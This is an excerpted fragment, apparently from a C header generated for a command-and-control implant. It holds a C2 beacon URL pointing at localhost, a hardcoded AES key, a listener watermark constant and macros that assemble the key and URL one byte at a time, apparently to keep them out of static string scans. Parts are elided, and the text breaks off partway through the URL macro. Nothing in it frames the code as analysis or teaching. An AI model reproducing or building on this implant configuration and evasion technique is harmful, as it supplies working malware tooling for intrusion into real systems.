 ...
 *
 *   C2 URL:   http://127.0.0.1:8080/api/v1/status
 *   AES Key:  358bc79fcaa8ea6e58960764b58f0d63
...
#define NAX_LISTENER_WM 0x984B8039u
...
#define NAX_AES_KEY_WRITE( p ) do { \
    (p)[ 0]=0x35; (p)[ 1]=0x8B; (p)[ 2]=0xC7; (p)[ 3]=0x9F; (p)[ 4]=0xCA; (p)[ 5]=0xA8; (p)[ 6]=0xEA; (p)[ 7]=0x6E; \
    (p)[ 8]=0x58; (p)[ 9]=0x96; (p)[10]=0x07; (p)[11]=0x64; (p)[12]=0xB5; (p)[13]=0x8F; (p)[14]=0x0D; (p)[15]=0x63; \
} while(0)

#define NAX_C2_URL_WRITE( p ) do { \
    (p)[ 0]='h'; (p)[ 1]='t'; (p)[ 2]='t'; (p)[ 3]='p'; (p)[ 4]=':'; (p)[ 5]='/'; (p)[ 6]='/'; (p)[ 7]='1'; \
    (p)[ 8]='2'; (p)[ 9]='7'; (p)[10]='.'; (p)[11]='0'; (p)[12]='.'; (p)[13]='0'; (p)[14]='.'; (p)[15]='1'; \
    (p)[16]=':'; (p)[17]='8'; (p)[18]='0'; (p)[19]='8'; (p)[20]='0'; (p)[21]='/'; (p)[22]='a'; (p)[23]='p'; \
